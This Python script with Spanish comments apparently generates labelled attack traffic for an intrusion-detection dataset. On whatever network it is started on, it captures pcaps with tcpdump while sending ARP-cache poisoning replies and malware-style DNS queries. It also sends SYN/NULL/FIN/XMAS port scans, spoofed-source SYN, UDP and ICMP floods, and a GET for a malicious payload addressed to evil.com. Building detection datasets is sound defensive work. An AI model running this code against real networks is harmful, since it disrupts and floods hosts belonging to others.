#!/usr/bin/env python3
"""
Simulador universal de ataques MITM - Funciona en cualquier red
Detecta automáticamente la configuración de red
"""

from scapy.all import *
import time
import random
import subprocess
import os
import signal
import netifaces
import ipaddress
from datetime import datetime

class UniversalAttackSimulator:
    def __init__(self, interface=None):
        self.interface = interface or self.detect_active_interface()
        self.network_info = self.get_network_info()
        self.running = False
        
        print(f"🎯 SIMULADOR UNIVERSAL DE ATAQUES MITM")
        print(f"="*50)
        print(f"Interfaz: {self.interface}")
        print(f"Tu IP: {self.network_info['your_ip']}")
        print(f"Gateway: {self.network_info['gateway']}")
        print(f"Red: {self.network_info['network']}")
        print(f"Rango IPs: {self.network_info['ip_range']}")
        print(f"="*50)
    
    def detect_active_interface(self):
        """Detectar interfaz activa automáticamente"""
        
        try:
            # Obtener interfaz de la ruta por defecto
            result = subprocess.run(['ip', 'route', 'show', 'default'], 
                                  capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'default via' in line:
                    parts = line.split()
                    for i, part in enumerate(parts):
                        if part == 'dev' and i + 1 < len(parts):
                            interface = parts[i + 1]
                            print(f"✅ Interfaz detectada automáticamente: {interface}")
                            return interface
            
            # Fallback: buscar interfaces con IP
            interfaces = netifaces.interfaces()
            for iface in interfaces:
                if iface == 'lo':
                    continue
                try:
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        print(f"✅ Usando interfaz: {iface}")
                        return iface
                except:
                    continue
            
            # Último fallback
            return 'eth0'
            
        except Exception as e:
            print(f"⚠️ Error detectando interfaz: {e}")
            return 'eth0'
    
    def get_network_info(self):
        """Obtener información de red automáticamente"""
        
        try:
            # Obtener IP de la interfaz
            addrs = netifaces.ifaddresses(self.interface)
            if netifaces.AF_INET not in addrs:
                raise Exception(f"No hay IP en {self.interface}")
            
            ip_info = addrs[netifaces.AF_INET][0]
            your_ip = ip_info['addr']
            netmask = ip_info['netmask']
            
            # Calcular red
            network = ipaddress.IPv4Network(f"{your_ip}/{netmask}", strict=False)
            
            # Obtener gateway
            gateways = netifaces.gateways()
            gateway = gateways['default'][netifaces.AF_INET][0]
            
            # Generar rango de IPs para ataques
            network_addr = str(network.network_address)
            base_ip = '.'.join(network_addr.split('.')[:-1])
            
            return {
                'your_ip': your_ip,
                'gateway': gateway,
                'network': str(network),
                'netmask': netmask,
                'base_ip': base_ip,
                'ip_range': list(network.hosts())[:20]  # Primeras 20 IPs
            }
            
        except Exception as e:
            print(f"❌ Error obteniendo info de red: {e}")
            # Fallback para casos especiales
            return {
                'your_ip': '192.168.1.100',
                'gateway': '192.168.1.1',
                'network': '192.168.1.0/24',
                'netmask': '255.255.255.0',
                'base_ip': '192.168.1',
                'ip_range': [f'192.168.1.{i}' for i in range(2, 22)]
            }
    
    def generate_random_ip_in_network(self):
        """Generar IP aleatoria en la red"""
        
        try:
            network = ipaddress.IPv4Network(self.network_info['network'], strict=False)
            hosts = list(network.hosts())
            return str(random.choice(hosts))
        except:
            # Fallback
            base = self.network_info['base_ip']
            return f"{base}.{random.randint(2, 254)}"
    
    def simulate_arp_anomalies(self, duration=300):
        """Simular anomalías ARP - UNIVERSAL"""
        
        print(f"🔥 Simulando anomalías ARP por {duration} segundos")
        print(f"Red objetivo: {self.network_info['network']}")
        
        start_time = time.time()
        self.running = True
        packet_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # 1. ARP requests excesivos a IPs aleatorias de la red
                for _ in range(5):
                    fake_ip = self.generate_random_ip_in_network()
                    arp_req = ARP(op=1, pdst=fake_ip, psrc=self.network_info['your_ip'])
                    send(arp_req, verbose=False)
                    packet_count += 1
                    time.sleep(0.1)
                
                # 2. ARP replies no solicitados
                fake_mac = f"02:00:00:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
                target_ip = self.generate_random_ip_in_network()
                
                arp_reply = ARP(
                    op=2, 
                    pdst=self.network_info['gateway'], 
                    hwdst="ff:ff:ff:ff:ff:ff",
                    psrc=target_ip, 
                    hwsrc=fake_mac
                )
                send(arp_reply, verbose=False)
                packet_count += 1
                
                # 3. Gratuitous ARP anómalos
                grat_arp = ARP(
                    op=2, 
                    pdst=self.network_info['your_ip'], 
                    hwdst="ff:ff:ff:ff:ff:ff",
                    psrc=self.network_info['your_ip'], 
                    hwsrc=fake_mac
                )
                send(grat_arp, verbose=False)
                packet_count += 1
                
                time.sleep(2)
                
                # Progreso cada 30 segundos
                elapsed = int(time.time() - start_time)
                if elapsed % 30 == 0 and elapsed > 0:
                    print(f"📊 ARP anomalías: {elapsed}s - {packet_count} paquetes enviados")
                    
            except Exception as e:
                print(f"⚠️ Error en ARP: {e}")
                time.sleep(1)
        
        print(f"✅ ARP anomalías completadas: {packet_count} paquetes")
    
    def simulate_dns_anomalies(self, duration=300):
        """Simular consultas DNS anómalas - UNIVERSAL"""
        
        print(f"🔥 Simulando anomalías DNS por {duration} segundos")
        
        start_time = time.time()
        self.running = True
        packet_count = 0
        
        suspicious_domains = [
            "malicious-site.com", "phishing-bank.net", "fake-update.org",
            "suspicious-download.info", "malware-host.biz", "evil-c2.net",
            "botnet-command.org", "data-exfil.com", "trojan-dropper.info"
        ]
        
        dns_servers = ["8.8.8.8", "1.1.1.1", "208.67.222.222", "9.9.9.9"]
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # Consultas DNS sospechosas
                domain = random.choice(suspicious_domains)
                dns_server = random.choice(dns_servers)
                
                # Consulta DNS anómala
                dns_query = IP(dst=dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
                send(dns_query, verbose=False)
                packet_count += 1
                
                # Múltiples consultas rápidas (comportamiento de malware)
                for _ in range(3):
                    random_domain = f"random{random.randint(1000,9999)}.{random.choice(['com', 'net', 'org'])}"
                    dns_query = IP(dst=dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=random_domain))
                    send(dns_query, verbose=False)
                    packet_count += 1
                    time.sleep(0.05)
                
                # Consultas DNS sobre TCP (anómalo)
                dns_tcp = IP(dst=dns_server)/TCP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
                send(dns_tcp, verbose=False)
                packet_count += 1
                
                time.sleep(5)
                
                # Progreso cada 60 segundos
                elapsed = int(time.time() - start_time)
                if elapsed % 60 == 0 and elapsed > 0:
                    print(f"📊 DNS anomalías: {elapsed}s - {packet_count} paquetes enviados")
                    
            except Exception as e:
                print(f"⚠️ Error en DNS: {e}")
                time.sleep(1)
        
        print(f"✅ DNS anomalías completadas: {packet_count} paquetes")
    
    def simulate_port_scan(self, duration=300):
        """Simular escaneo de puertos - UNIVERSAL"""
        
        print(f"🔥 Simulando escaneo de puertos por {duration} segundos")
        print(f"Objetivos en red: {self.network_info['network']}")
        
        start_time = time.time()
        self.running = True
        packet_count = 0
        
        # Puertos comunes para escanear
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3389, 5432, 8080]
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # Seleccionar objetivo aleatorio en la red
                target_ip = self.generate_random_ip_in_network()
                port = random.choice(common_ports)
                
                # Diferentes tipos de escaneo
                scan_type = random.choice(['syn', 'null', 'fin', 'xmas'])
                
                if scan_type == 'syn':
                    packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
                elif scan_type == 'null':
                    packet = IP(dst=target_ip)/TCP(dport=port, flags="")
                elif scan_type == 'fin':
                    packet = IP(dst=target_ip)/TCP(dport=port, flags="F")
                else:  # xmas
                    packet = IP(dst=target_ip)/TCP(dport=port, flags="FPU")
                
                send(packet, verbose=False)
                packet_count += 1
                
                # Escaneo rápido de múltiples puertos
                if random.random() < 0.3:  # 30% de probabilidad
                    for quick_port in random.sample(common_ports, 5):
                        quick_packet = IP(dst=target_ip)/TCP(dport=quick_port, flags="S")
                        send(quick_packet, verbose=False)
                        packet_count += 1
                        time.sleep(0.01)
                
                time.sleep(0.5)
                
                # Progreso cada 60 segundos
                elapsed = int(time.time() - start_time)
                if elapsed % 60 == 0 and elapsed > 0:
                    print(f"📊 Port scan: {elapsed}s - {packet_count} paquetes enviados")
                    
            except Exception as e:
                print(f"⚠️ Error en port scan: {e}")
                time.sleep(1)
        
        print(f"✅ Port scan completado: {packet_count} paquetes")
    
    def simulate_traffic_injection(self, duration=300):
        """Simular inyección de tráfico malicioso"""
        
        print(f"🔥 Simulando inyección de tráfico por {duration} segundos")
        
        start_time = time.time()
        self.running = True
        packet_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            try:
                target_ip = self.generate_random_ip_in_network()
                
                # Diferentes tipos de inyección
                injection_type = random.choice(['tcp_flood', 'udp_flood', 'icmp_flood', 'http_injection'])
                
                if injection_type == 'tcp_flood':
                    # TCP SYN flood
                    packet = IP(dst=target_ip, src=self.generate_random_ip_in_network()) / \
                            TCP(dport=random.randint(1, 65535), flags="S")
                
                elif injection_type == 'udp_flood':
                    # UDP flood
                    packet = IP(dst=target_ip, src=self.generate_random_ip_in_network()) / \
                            UDP(dport=random.randint(1, 65535)) / \
                            Raw(RandString(random.randint(10, 100)))
                
                elif injection_type == 'icmp_flood':
                    # ICMP flood
                    packet = IP(dst=target_ip, src=self.generate_random_ip_in_network()) / \
                            ICMP(type=8, code=0) / \
                            Raw(RandString(random.randint(10, 100)))
                
                else:  # http_injection
                    # HTTP malicioso
                    malicious_payload = b"GET /malicious/payload HTTP/1.1\r\nHost: evil.com\r\n\r\n"
                    packet = IP(dst=target_ip) / TCP(dport=80) / Raw(malicious_payload)
                
                send(packet, verbose=False)
                packet_count += 1
                
                time.sleep(random.uniform(0.01, 0.1))
                
                # Progreso cada 60 segundos
                elapsed = int(time.time() - start_time)
                if elapsed % 60 == 0 and elapsed > 0:
                    print(f"📊 Traffic injection: {elapsed}s - {packet_count} paquetes enviados")
                    
            except Exception as e:
                print(f"⚠️ Error en traffic injection: {e}")
                time.sleep(1)
        
        print(f"✅ Traffic injection completado: {packet_count} paquetes")

def capture_with_simulation(attack_type, duration=300, interface=None):
    """Capturar tráfico mientras se simula ataque - UNIVERSAL"""
    
    # Crear directorio
    os.makedirs('data/raw/mitm', exist_ok=True)
    
    # Nombre del archivo
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"data/raw/mitm/mitm_{attack_type}_{timestamp}.pcap"
    
    # Crear simulador
    simulator = UniversalAttackSimulator(interface=interface)
    actual_interface = simulator.interface
    
    # Iniciar captura
    cmd = f"sudo tcpdump -i {actual_interface} -w {filename}"
    capture_process = subprocess.Popen(cmd.split())
    
    print(f"\n📡 Captura iniciada: {filename}")
    print(f"🎯 Simulando ataque: {attack_type}")
    print(f"🌐 Red detectada: {simulator.network_info['network']}")
    
    try:
        if attack_type == "arp":
            simulator.simulate_arp_anomalies(duration)
        elif attack_type == "dns":
            simulator.simulate_dns_anomalies(duration)
        elif attack_type == "portscan":
            simulator.simulate_port_scan(duration)
        elif attack_type == "injection":
            simulator.simulate_traffic_injection(duration)
        elif attack_type == "all":
            # Ejecutar todos los ataques en paralelo
            import threading
            
            attack_duration = duration // 4
            threads = []
            
            threads.append(threading.Thread(target=simulator.simulate_arp_anomalies, args=(attack_duration,)))
            threads.append(threading.Thread(target=simulator.simulate_dns_anomalies, args=(attack_duration,)))
            threads.append(threading.Thread(target=simulator.simulate_port_scan, args=(attack_duration,)))
            threads.append(threading.Thread(target=simulator.simulate_traffic_injection, args=(attack_duration,)))
            
            for thread in threads:
                thread.start()
                time.sleep(5)  # Espaciar inicio
            
            for thread in threads:
                thread.join()
        
    except KeyboardInterrupt:
        print("\n⏹️ Simulación interrumpida por usuario")
    finally:
        simulator.running = False
        capture_process.send_signal(signal.SIGTERM)
        capture_process.wait()
        print(f"✅ Captura guardada: {filename}")
        return filename

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Simulador universal de ataques MITM')
    parser.add_argument('--attack', choices=['arp', 'dns', 'portscan', 'injection', 'all'], 
                       required=True, help='Tipo de ataque a simular')
    parser.add_argument('--duration', type=int, default=300, help='Duración en segundos')
    parser.add_argument('--interface', help='Interfaz de red (auto-detecta si no se especifica)')
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("❌ Requiere permisos de root: sudo python3 ...")
        exit(1)
    
    # Instalar dependencias si faltan
    try:
        import netifaces
        import ipaddress
    except ImportError:
        print("📦 Instalando dependencias...")
        subprocess.run(['pip', 'install', 'netifaces'])
        import netifaces
        import ipaddress
    
    filename = capture_with_simulation(args.attack, args.duration, args.interface)
    print(f"\n🎯 ¡Listo! Archivo generado: {filename}")
    print("📊 Siguiente paso: python3 scripts/extract_features.py")